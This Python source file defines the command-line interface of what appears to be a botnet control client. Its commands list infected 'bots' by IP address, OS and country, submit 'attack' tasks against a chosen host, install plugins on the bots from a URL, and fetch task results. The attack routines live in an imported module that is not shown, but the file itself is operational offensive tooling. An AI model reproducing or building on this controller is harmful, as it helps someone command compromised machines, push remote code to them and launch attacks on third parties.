#!/usr/bin/env python
from classes.operations_test import Operations
from classes.help import Help


class Options:
    @staticmethod
    def help(args):
        # Describe usage of the cli
        ops = ['help', 'bot_list', 'task_submit', 'plugin_install', 'task_status', 'task_clear', 'task_output',
               'task_list', 'plugin_list', 'plugin_clear', 'plugin_help']
        if len(args) == 0 or args[0] not in ops: param = 'help'
        else: param = args[0]
        getattr(Help, param)()

    @staticmethod
    def bot_list(args):
        # List available bots {bot_list $host $port key:$key since:$time}
        try:
            param = {}
            bot_list = []
            if len(args) < 2: print('Invalid parameters'); return
            if len(args) == 2: bot_list = Operations.list(args[0], args[1])
            if len(args) > 2: param = Operations.hash_args(args[2:])
            if 'since' in param.keys(): bot_list = Operations.list(args[0], args[1], param['since'])
            if 'key' not in param.keys() or param['key'] not in ['id', 'ipAddress', 'os', 'countryCode', 'zip']:
                bot_list = Operations.sort(bot_list, 'lastSeen')
            else:
                bot_list = Operations.sort(bot_list, param['key'])
            print(Operations.print_list(bot_list))
        except: print("Error connecting")

    @staticmethod
    def task_submit(args):
        # Request new task {attack $host $port $attack [$parameters]}
        try:
            param = {}
            if len(args) < 3: print('Invalid parameters'); return
            if len(args) > 3: param = Operations.hash_args(args[3:])
            if param == -1: print('Invalid attack parameters'); return
            print(Operations.attack(args[0], args[1], args[2], param))
        except: print("Error connecting")

    @staticmethod
    def plugin_install(args):
        # Install new plugin {plugin_install $host $port $name $url}
        try:
            if len(args) < 4: print('Invalid parameters'); return
            param = Operations.hash_args(args[2:])
            print(Operations.install(args[0], args[1], param))
        except: print("Error connecting")

    @staticmethod
    def task_status(args):
        # Check task completion status {task_status $host $port $id ($block)}
        try:
            if len(args) < 3: print('Invalid parameters'); return
            block = True
            response = ''
            while block:
                response = Operations.status(args[0], args[1], args[2])
                block = (len(args) > 3 and args[3] == 'block' and Operations.block(response))
            print(response)
        except: print("Error connecting")

    @staticmethod
    def task_clear(args):
        # Clear task from control center {task_clear $host $port $id}
        try:
            if len(args) < 3: print('Invalid parameters'); return
            print(Operations.clear(args[0], args[1], args[2]))
        except: print("Error connecting")

    @staticmethod
    def task_output(args):
        # Get task result {task_output $host $port $id}
        try:
            if len(args) < 3: print('Invalid parameters'); return
            print(Operations.output(args[0], args[1], args[2]))
        except: print("Error connecting")

    @staticmethod
    def task_list(args):
        # List tasks {tasks $host $port}
        try:
            if len(args) < 2: print('Invalid parameters'); return
            print(Operations.task_list(args[0], args[1]))
        except: print("Error connecting")

    @staticmethod
    def plugin_list(args):
        # Lists installed plugins {plugin_list $host $port}
        try:
            if len(args) < 2: print('Invalid parameters'); return
            print(Operations.plugin_list(args[0], args[1]))
        except: print("Error connecting")

    @staticmethod
    def plugin_help(args):
        # Help for installed plugin {plugin_help $host $port $id}
        try:
            if len(args) < 3: print('Invalid parameters'); return
            print(Operations.plugin_help(args[0], args[1], args[2]))
        except: print("Error connecting")